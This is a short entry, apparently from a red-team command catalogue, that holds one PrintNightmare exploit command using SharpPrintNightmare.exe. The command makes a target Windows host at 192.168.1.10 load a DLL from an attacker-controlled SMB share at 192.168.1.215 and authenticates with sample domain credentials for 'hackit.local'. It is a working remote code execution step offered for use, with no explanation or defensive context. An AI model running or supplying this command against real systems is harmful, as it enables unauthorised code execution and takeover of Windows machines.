---
id: 25ad2d54-5ad9-4762-ae89-c26b568d809d
name: RCE using runas /netonly using SharpPrintNightmare.exe
type: command
executor: bash
data: SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL'
  '\\192.168.1.10' hackit.local domain_user Pass123
output: null
created_at: '2023-04-06T03:56:02.971335+00:00'
updated_at: '2023-04-10T20:26:14.546143+00:00'
---

# RCE using runas /netonly using SharpPrintNightmare.exe

```bash
SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
```


